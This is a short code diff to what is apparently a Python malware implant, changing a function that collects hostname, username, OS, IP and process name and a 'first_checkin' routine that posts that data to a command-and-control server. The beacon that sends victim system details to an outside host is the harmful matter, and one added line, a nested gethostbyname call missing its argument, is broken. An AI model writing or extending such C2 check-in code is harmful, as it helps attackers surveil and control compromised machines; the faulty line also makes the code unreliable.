@@ -13,7 +13,7 @@ def get_sysinfo():
             "hostname": socket.gethostname(),
             "username": os.getlogin(),
             "os": f"{os.name} {sys.platform}",
-            "ip": socket.getaddrinfo,
+            "ip": socket.gethostbyname(socket.gethostbyname()),
             "process": sys.argv[0]
         }
         return sysinfo
@@ -24,12 +24,9 @@ def first_checkin(SERVER_URL, json_info):
     """ Check in with the c2 server """
     try:
         response = requests.post(SERVER_URL, json=json_info)
-        if response.status_code == 200:
-            print("Check-in worked")
-            print(response.json())
-            return response.json()
-        else:
-            print("Check-in failed")
-            return None
+        print(f"Sent: {json_info}")
+        print(f"Response: {response.text}")
+        return response.status_code == 200
     except:
-        return None
+        print("Error")
+        return False
